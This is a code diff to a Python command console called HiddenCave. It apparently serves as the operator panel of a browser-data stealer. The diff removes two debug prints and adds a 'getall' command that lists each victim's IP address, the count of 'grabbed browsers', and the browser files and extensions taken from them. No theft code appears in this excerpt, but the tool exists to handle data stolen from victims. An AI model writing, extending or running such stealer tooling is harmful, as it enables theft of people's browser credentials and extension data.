@@ -51,7 +51,6 @@ class HiddenCave(cmd.Cmd):
 
             print("[+] Enter the endpoint URL. It must be an HTTP URL and should not end with a slash.\n    Example of a valid URL: http://127.0.0.1")
             UserInput = self.core.GetUserInput("ENDPOINT: ", "", 0, None, True)
-            print()
             if UserInput[:7] != "http://":
                 while True:
                     print("[-] Invalid input, the endpoint URL must be http.")
@@ -59,7 +58,6 @@ class HiddenCave(cmd.Cmd):
                     if UserInput[:7] == "http://":
                         break
             self.core.EndPoint = UserInput
-            print(self.core.EndPoint)
 
     def do_save(self, arg):
         """save command\n"""
@@ -91,6 +89,34 @@ class HiddenCave(cmd.Cmd):
     def do_check(self, arg):
         """endpoint and cryptographic parameters check command\n"""
         self.core.check()
+
+    def do_getall(self, arg):
+        """getall command\n"""
+        data = self.core.GetVictims()
+
+        if data is not None:
+            for ip in data.keys():
+                TotalBrowsers = int(data[ip]["BrowserCount"])
+                print("#" * 35)
+                print(f"[+] Victim IP: {ip}")
+                print(f"[+] Total grabbed browsers: {TotalBrowsers}")
+
+                for i in range(0, TotalBrowsers):
+                    print(f"[+] Browser {i + 1}")
+
+                    extentions = data[ip]["browsers"][i]["extentions"]
+                    BrowserFiles = data[ip]["browsers"][i]["browserfiles"]
+
+                    print("    Browser files:")
+                    for file in BrowserFiles:
+                        print(f"\t- {file}")
+
+                    print("    Extentions:")
+                    for extention in extentions.keys():
+                        print(f"\t- {extention}")
+            print("#" * 35)
+        else:
+            print("[-] You should first run the command check to check the endpoint and cryptographic parameters.")
 
 
 if __name__ == '__main__':
